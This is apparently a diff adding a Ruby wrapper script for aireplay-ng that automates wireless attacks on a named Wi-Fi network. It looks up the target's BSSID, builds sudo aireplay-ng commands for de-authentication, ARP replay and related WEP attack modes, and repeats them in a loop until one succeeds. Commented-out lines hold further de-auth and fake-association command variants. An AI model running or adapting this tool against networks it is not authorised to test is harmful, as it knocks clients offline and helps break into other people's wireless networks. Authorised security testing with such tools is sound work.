@@ -1,0 +1,85 @@
+#!/usr/bin/ruby -w
+# purpose : wrapper for aireplay-ng
+usage = <<usage
+usage:
+  #{$0} [ssid] [source iface] [mac] 
+usage
+
+# TODO:
+# - read source MAC from scan?
+
+# see aireplay-ng man page for attack modes, defaults to 3
+# common wep attack modes:
+# 0 : de auth
+# 3 : arp replay
+# 6 : caffe latte (reads from clients if AP is not in range)
+# 7 : cfrag (sends arps back to clients/APs)
+# 9 : test injection capability
+
+$:.unshift File.join(File.dirname(__FILE__), '.')
+require 'airutils'
+require 'pp'
+
+ifaces_wireless = AirUtils.list_ifaces_wireless()
+
+essid = nil
+if (!ARGV[0])
+  puts usage
+  pp ifaces_wireless
+  exit 2
+end
+essid = ARGV[0]
+
+# set the source mac, needed for some attacks
+# - command line arg overrides everything, can be wlan iface or MAC
+# - otherwise if we have one wlan interface, use that
+
+iface_crack = nil
+mac_iface_crack = nil 
+if (ARGV[1]) then
+  #if (ifaces_wireless.include?(ARGV[1]))
+    iface_crack = ARGV[1]
+  #end
+elsif (ifaces_wireless.length == 1)
+  iface_crack = ifaces_wireless[0]
+  mac_iface_crack = AirUtils.fetch_mac_for_iface(iface_crack) 
+else
+  puts usage
+  pp ifaces_wireless
+  exit 2
+end
+
+mac_iface_crack = nil
+if (ARGV[2])
+  mac_iface_crack = ARGV[2] 
+else
+  mac_iface_crack = AirUtils.fetch_mac_for_iface(iface_crack) 
+end
+
+attack_mode = 3
+if (ARGV[3]) then
+  attack_mode = ARGV[3]
+end
+bssid, channel = AirUtils.parse_scan(ARGV[0])
+
+# associate with the essid
+	
+syntax_aireplay = []
+#syntax_aireplay[0] = "sudo aireplay-ng -1 6000 -o 1 -q 10 -e \"%s\" -a %s -h %s %s" % [essid, bssid, $mac_iface_crack, $iface_crack]
+#syntax_aireplay[0] = "sudo aireplay-ng -3 -o 0 -q 10 -e \"%s\" -a %s -h %s %s" % [essid, bssid, $mac_iface_crack, $iface_crack]
+#syntax_aireplay[0] = "sudo aireplay-ng -0 1 --deauth 1 -o 0 -q 10 -e \"%s\" -a %s -h %s -i %s %s" % [essid, bssid, mac_iface_crack, $iface_crack, $iface_crack]
+# this one doesn't send keepalives
+#syntax_aireplay[1] = "sudo aireplay-ng -1 0 -e %s -a %s -h %s %s" % [essid, bssid, $mac_iface_crack, $iface_crack]
+#syntax_aireplay[0] = "sudo aireplay-ng -%s -o 0 -q 10 -e \"%s\" -a %s -h %s -i %s %s" % [attack_mode, essid, bssid, mac_iface_crack, iface_crack, iface_crack]
+syntax_aireplay[0] = "sudo aireplay-ng -%s -o 0 -q 10 -e \"%s\" -a %s -h %s -i %s %s" % [attack_mode, essid, bssid, mac_iface_crack, iface_crack, iface_crack]
+
+
+# run random attacks until one succeeds 
+
+rc = 1
+until (rc == 0) do
+	syntax = syntax_aireplay[rand(syntax_aireplay.length)]
+	puts syntax
+	rc = system(syntax)
+	sleep(10)
+end
